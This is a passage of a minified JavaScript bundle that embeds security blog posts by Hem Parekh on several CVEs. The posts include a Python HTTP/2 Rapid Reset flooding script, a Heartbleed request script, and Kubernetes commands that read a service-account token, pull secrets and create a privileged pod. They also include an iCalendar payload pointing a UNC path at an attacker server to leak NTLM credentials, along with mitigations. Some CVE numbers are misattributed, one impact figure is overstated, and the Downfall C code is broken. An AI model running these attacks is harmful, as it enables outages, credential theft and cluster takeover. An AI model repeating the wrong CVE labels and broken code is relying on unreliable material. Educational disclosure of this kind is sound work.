u.jsxs(u.Fragment,{children:[u.jsx(Hh,{data:Uh}),u.jsx("div",{className:"container blog-controls",children:u.jsx(Wh,{posts:lr,onFilter:n})}),u.jsx(Vh,{posts:e})]})}const Gh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Qh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Yh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
